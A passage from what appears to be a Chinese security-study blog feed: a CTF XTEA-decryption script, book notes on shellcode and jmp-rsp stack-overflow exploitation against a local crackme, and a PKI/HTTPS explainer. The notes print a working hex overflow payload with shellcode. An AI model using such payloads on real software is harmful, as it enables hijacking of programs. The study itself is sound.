class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Encrypted_data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">0x90508D47</span> - delta*<span class="hljs-number">33</span>*<span class="hljs-number">4</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">33</span>;i++){<br>        sum += delta;<br>        v1 -= ((<span class="hljs-number">32</span>*v0)^(v0&gt;&gt;<span class="hljs-number">4</span>) + v0) ^ (sum + Key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        v0 -= ((<span class="hljs-number">32</span>*v1)^(v1&gt;&gt;<span class="hljs-number">4</span>) + v1) ^ (sum + Key[sum &amp; <span class="hljs-number">3</span>]) ^ sum;<br>    }<br>}<br></code></pre></td></tr></table></figure><p>下面就是魔改后的XTEA算法的解密脚本，然后在主函数中发现之后还有一个切割逻辑，方便和答案比较，在实际的解密脚本中无需太过关心。</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-03_15-27-02.png" class=""><p>下面是完整脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> delta 0x77BF7F99</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">uint32_t</span> Key[<span class="hljs-number">4</span>] = {<span class="hljs-number">0x62</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x62</span>};<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Encrypted_data[] = <br>{<br>    <span class="hljs-number">0xE0</span>,<span class="hljs-number">0xF2</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0xC2</span>,<span class="hljs-number">0xD8</span>,<span class="hljs-number">0x8E</span>,<br>    <span class="hljs-number">0x93</span>,<span class="hljs-number">0xC3</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0xF2</span>,<span class="hljs-number">0xDD</span>,<br>    <span class="hljs-number">0x99</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x8C</span>,<br>    <span class="hljs-number">0xF2</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xDC</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0xD2</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0xC1</span><br>};<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *Data,<span class="hljs-type">uint32_t</span> *Key)</span></span>{<br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0x90508D47</span>;<br>    <span class="hljs-type">uint32_t</span> v0 = Data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">uint32_t</span> v1 = Data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">4</span> ;j++){<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">33</span>;i++){<br>            v0 += ((<span class="hljs-number">32</span>*v1)^(v1&gt;&gt;<span class="hljs-number">4</span>) + v1) ^ (sum + Key[sum &amp; <span class="hljs-number">3</span>]) ^ sum;<br>            v1 += ((<span class="hljs-number">32</span>*v0)^(v0&gt;&gt;<span class="hljs-number">4</span>) + v0) ^ (sum + Key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>            sum -= delta;<br>        }<br>    }<br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> Encrypted_data[<span class="hljs-number">2</span>],<span class="hljs-type">uint32_t</span> Key[<span class="hljs-number">4</span>])</span></span>{<br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0x90508D47</span>;<span class="hljs-comment">// - delta*33*4;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i)<br>    {<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">33</span>; ++j)<br>        {<br>            sum -= delta;<br>        }<br>    }<br>    <span class="hljs-type">uint32_t</span> v0 = Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">uint32_t</span> v1 = Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>    {<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">33</span>;i++){<br>            sum += delta;<br>            v1 -= (((<span class="hljs-number">32</span>*v0)^(v0&gt;&gt;<span class="hljs-number">4</span>)) + v0) ^ (sum + Key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>            v0 -= (((<span class="hljs-number">32</span>*v1)^(v1&gt;&gt;<span class="hljs-number">4</span>)) + v1) ^ (sum + Key[sum &amp; <span class="hljs-number">3</span>]) ^ sum;<br>        }<br>    }<br>Encrypted_data[<span class="hljs-number">0</span>]=v0;<br>Encrypted_data[<span class="hljs-number">1</span>]=v1;<br>}<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<br>    <span class="hljs-type">uint32_t</span> *flag = (<span class="hljs-type">uint32_t</span> *)Encrypted_data;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span> ; i++){<br>        <span class="hljs-built_in">Decrypt</span>(&amp;flag[i*<span class="hljs-number">2</span>],Key);<br>    }<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>,flag);<br>}<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0Day安全软件漏洞分析第2版阅读随笔3</title>
    <link href="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/"/>
    <url>/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/</url>
    
    <content type="html"><![CDATA[<h1 id="0Day安全软件漏洞分析第2版阅读随笔3"><a href="#0Day安全软件漏洞分析第2版阅读随笔3" class="headerlink" title="0Day安全软件漏洞分析第2版阅读随笔3"></a>0Day安全软件漏洞分析第2版阅读随笔3</h1><p>​开启第三章的阅读，在第二章学习了基本的栈溢出原理之后，我们已经调试过如何在缓冲区植入代码了，那么接下来将继续学习如何更专业地植入代码，或者说开发<code>shellcode</code>😋</p><span id="more"></span><h2 id="第三章-开发shellcode的艺术"><a href="#第三章-开发shellcode的艺术" class="headerlink" title="第三章-开发shellcode的艺术"></a>第三章-开发shellcode的艺术</h2><p>​<code>shellcode</code>这个专用术语来通称缓冲区溢出攻击中植入进程的代码。这 段代码可以是出于恶作剧目的的弹出一个消息框，也可以是出于攻击目的的删改重要文件、窃取 数据、上传木马病毒并运行，甚至是出于破坏目的的格式化硬盘等。请注意本章讨论的<code>shellcode</code>是这种广义上的植入进程的代码，而不是狭义上的仅仅用来获得 <code>shell</code>的代码。</p><p>​我们还会经常看到另一个术语——<code>exploit</code>。 植入代码之前需要做大量的调试工作，例如，弄清楚程序有几个输入点，这些输入将最终 会当作哪个函数的第几个参数读入到内存的哪一个区域，哪一个输入会造成栈溢出，在复制到栈区的时候对这些数据有没有额外的限制等。调试之后还要计算函数返回地址距离缓冲区的偏 移并淹没之，选择指令的地址，最终制作出一个有攻击效果的“承载”着<code>shellcode</code>的输入字符 串。这个代码植入的过程就是漏洞利用，也就是<code>exploit</code>。<code>exploit</code>一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他形式的攻击性 输入。<code>expliot</code>的核心是淹没返回地址，劫持进程的控制权，之后跳转去执行<code>shellcode</code>。与<code>shellcode</code>具有一定的通用性不同，<code>exploit</code>往往是针对特定漏洞而言的。</p><p>比如我们在第二章里写的代码：</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-40-46.png" class=""><h3 id="开发shellcode需要解决的问题"><a href="#开发shellcode需要解决的问题" class="headerlink" title="开发shellcode需要解决的问题"></a>开发shellcode需要解决的问题</h3><p>​通过上面的介绍，你应该已经明白了什么是<code>shellcode</code>，正是我们在第二章植入的那段机器码。在第二章的植入代码部分，我们是通过手动查找得到函数调用的地址以及函数返回地址，这显然不是通用的。加之，当存在缺陷的函数处于<code>ddl</code>中，并且被程序动态装载，地址每次都存在变化，这时就需要我们找到一种方式，使得能够自动定位到<code>shellcode</code>的地址。</p><h3 id="定位shellcode"><a href="#定位shellcode" class="headerlink" title="定位shellcode"></a>定位shellcode</h3><h4 id="栈帧移位与jmp-esp"><a href="#栈帧移位与jmp-esp" class="headerlink" title="栈帧移位与jmp esp"></a>栈帧移位与jmp esp</h4><p>关于栈帧移位，笔者在这里不太了解实际的过程，暂且记下，现在只关注如何动态定位。</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_16-27-19.png" class=""><p>​通过前两章的调试，我们其实已经很清楚指令执行和栈变化的过程，可以发现的是，每次函数调用完成之前，都会将之前减去的栈偏移加回来，所以我们可以发现，此时<code>esp</code>(64位下<code>rsp</code>)寄存器的内容正好在我们的返回地址的下一个位置，注意这里指的是栈上返回地址对应的地方，<code>esp</code>是栈帧指针。</p><p>​所以动态定位不就可以实现了，我们在系统找到一个<code>jmp rsp</code>指令的地址，然后在返回地址处填上这个地址，那么之后就会执行这个指令跳转到当前<code>rsp</code>存放的地址，也就是栈上淹没返回地址处后一个位置<code>shellcode</code>就在这之后执行。</p><p>所以重新的规划大概如下图：</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-37-55.png" class=""><h4 id="x64dbg如何搜索跳板指令位置"><a href="#x64dbg如何搜索跳板指令位置" class="headerlink" title="x64dbg如何搜索跳板指令位置"></a>x64dbg如何搜索跳板指令位置</h4><p>笔者之前已经提到，我是在64位机器上进行的操作，所以只能采用x64dbg，没有使用书里的OD，暂时没有找到什么好用的插件可以之间定位到我们需要的<code>dll</code>库中的跳板位置，所以这里我采用原始的搜索方式。</p><p>直接右键搜索命令：<code>jmp rsp</code></p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-58-55.png" class=""><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-59-11.png" class=""><p>这里我就直接采用了第一个地址<code>00007FFC81014A53</code>，在内存布局中找到，确认是系统模块</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_19-02-55.png" class=""><h4 id="crack-me5"><a href="#crack-me5" class="headerlink" title="crack_me5"></a>crack_me5</h4><p>程序和crack_me4是一样的，只是我们要改变我们的劫持流程。</p><p>首先我们已经获取到了跳板地址，在上面，由于是系统模块，所以一般还是不会变的。然后找到<code>MessageBoxA</code>函数的地址，采用读书笔记2的方法。</p><p>可以发现这次的地址改变了，说明确实是动态加载的，所以这里应该有个疑问<code>MessageBoxA</code>的地址怎么动态获取，笔者在这里还不知道具体的解决方案。查到是<code>00007FFC8361A000</code>，查到ExitProcess函数的地址为<code>00007FFC82DEE3B0</code></p><p>下面制作我们所说的<code>exploit</code>：在之前的基础上加入了退出调用</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">3132333435363738313233343536373831323334353637383132333435363738313233343536373831323334353637383132333435363738534</span>A0181FC7F11114883EC4833DB5348B82165723068737833508BC45350505348B8A06183FC7F11111148C1E01848C1E810FFD04883C44848B8B0E3DE82FC7F111148C1E01048C1E810FFD<span class="hljs-number">04883C448</span><br></code></pre></td></tr></table></figure><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-56-12.png" class=""><p>然后进行调试过程：</p><p>我们在<code>strcpy</code>函数调用之后那个地方打断点，直接运行到那个地方，这里因为防止截断，我将64位中的0换为了1，然后在此时修改栈上的数据，目前没有找到更好的解决办法</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-46-58.png" class=""><p>已经跳转到了我们的跳板地址</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-50-02.png" class=""><p>这里参考读书笔记2，修改一下在栈上的执行权限，继续步进</p><p>可以发现已经如我们分析的那样，跳转回到了我们布置好的<code>shellcode</code>处</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-52-35.png" class=""><p>正常跳转到弹窗函数：</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-57-18.png" class=""><p>可以发现已经跳到退出函数的地方</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_22-03-42.png" class=""><p>然后就可以正常退出了，虽然不知道为何不能弹窗。唉</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>软件与系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTPS中的数字认证原理</title>
    <link href="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/"/>
    <url>/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="HTTPS中的数字认证原理"><a href="#HTTPS中的数字认证原理" class="headerlink" title="HTTPS中的数字认证原理"></a>HTTPS中的数字认证原理</h2><p>笔者在近期学习了数字认证技术相关的东西，对其中公钥基础设施PKI进行较为深入的挖掘，于是写下此篇博客。🙈</p><span id="more"></span><h3 id="https与http"><a href="#https与http" class="headerlink" title="https与http"></a>https与http</h3><p>在开始CA相关的东西时，我们首先应该了解https和http。</p><p>HTTP（Hypertext Transfer Protocol）和HTTPS（HTTP Secure）是两种常见的用于在客户端和服务器之间传输数据的协议。<strong>从网络协议的底层来说，两者并无区别，但是https实现了更加安全的传输过程。</strong></p><p>具体有下面的区别：</p><ol><li>默认端口：http是80，https是443</li><li>传输内容：http是明文传输，https是加密传输</li><li>建立连接方式：http是直接连接，https需要SSL/TLS握手过程</li></ol><h3 id="数字认证原理"><a href="#数字认证原理" class="headerlink" title="数字认证原理"></a>数字认证原理</h3><h4 id="公钥基础设施PKI"><a href="#公钥基础设施PKI" class="headerlink" title="公钥基础设施PKI"></a>公钥基础设施PKI</h4><p>举一个简单的例子，一个用户在浏览器里访问网站时，如何才能判别访问的网站是安全可信的呢？</p><p>此时只有引入绝对公正的第三方（一般为政府）作为证明者，证明所访问的网站是可信的，这就是公钥基础设施的由来。</p><p>我们已经知道，https在为客户端和服务端建立连接之前需要进行SSL/TLS握手过程，那么这个过程的实现基础就是PKI。</p><p>那么PKI中，用什么作为信任根或者说信任凭证呢，就是我们常说的证书啦😀</p><p><strong>数字证书是最常见的证书类型，它包含了公钥、实体的身份信息以及证书颁发机构的签名。理所当然的，证书使用的是非对称密码体制。正常情况下，系统会安装CA的根证书用于验证其签发的证书</strong></p><p>目前的浏览器会对用户进行提醒，如果网站的证书过期，会提示有风险。</p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_20-35-07.png" class=""><h4 id="证书颁发机构CA-注册机构RA"><a href="#证书颁发机构CA-注册机构RA" class="headerlink" title="证书颁发机构CA&&注册机构RA"></a>证书颁发机构CA&amp;&amp;注册机构RA</h4><p>RA是注册机构（Registration Authority）的缩写。</p><p>在公钥基础设施（PKI）中，注册机构是与证书颁发机构（CA）合作的实体，负责收集、审核和验证实体的身份信息，并向CA提供这些信息以用于数字证书的签发。注册机构在PKI中发挥重要的角色，它们与CA一起确保数字证书的可信性和准确性。注册机构负责收集申请者的身份信息，可能包括个人身份证明、组织文件、域名所有权验证等。注册机构会对这些信息进行审核和验证，确保其真实性和合法性。</p><p>CA是证书颁发机构（Certificate Authority）的缩写。</p><p>证书颁发机构是一个受信任的实体，负责签发和管理数字证书，以验证实体的身份和信息的真实性。在公钥基础设施（PKI）中，<strong>CA是PKI体系结构的核心组成部分之一</strong>。它们使用自己的私钥对数字证书进行签名，并为实体（如网站、个人或设备）颁发包含公钥和身份信息的数字证书。</p><p>CA的主要职责包括：</p><ol><li>身份验证：CA会对申请数字证书的实体进行身份验证，以确保其合法性和真实性。这可以包括验证个人的身份证明、组织的注册文件、域名所有权等，当然也可以通过RA进行代理。</li><li>签发证书：一旦CA验证了申请者的身份信息，它会<strong>使用自己的私钥和根证书对数字证书进行签名</strong>，并将证书发送给申请者。该证书包含了实体的公钥、身份信息以及CA的签名。</li><li>证书管理：CA负责管理已签发的数字证书。这包括证书的更新、吊销和过期处理等操作。CA还维护一个公共的证书撤销列表（CRL），其中包含已吊销的证书的信息。</li><li>可信性建立：由于CA是受信任的实体，其签名可以用于验证数字证书的真实性和完整性。其他实体可以通过验证证书的签名和查看CA的信任列表来确认证书的有效性。</li></ol><h3 id="证书的颁发-验证"><a href="#证书的颁发-验证" class="headerlink" title="证书的颁发&验证"></a>证书的颁发&amp;验证</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>从上文已经知道，证书的颁发和验证是通过CA来完成的，那么下面具体讲一讲实现过程。</p><p>一般来说，在单向认证过程中只需要用户验证服务端证书，只有服务端需要请求CA颁发证书。那么服务端，具体来讲就是一个网站，需要向CA申请一个证书，首先发送证书签发请求，然后通过CA的身份验证合法性后，继续向CA发送一个证书请求文件CSR，CA在接收到证书请求文件后，会使用根证书和私钥对其进行签名，然后就会生成一个证书文件CRT，返回给服务端。</p><p>大概过程如下：</p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/CA%E9%A2%81%E5%8F%91%E8%BF%87%E7%A8%8B.png" class=""><p>证书的验证是通过系统安装的CA机构的根证书来验证的。</p><p>那么双向认证是基于单向认证的，很好理解，笔者将双向认证的过程也画了一张图😋：</p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B.png" class=""><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>笔者知道，上面的文字叙述过于繁琐，那么下面笔者上代码，这是笔者用Python和OpenSSL库开发的一个的基于双向认证的CA签发模拟程序。</p><p>大概有如下效果：</p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-11-34.png" class=""><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-12-47.png" class=""><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-12-57.png" class=""><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-13-27.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span 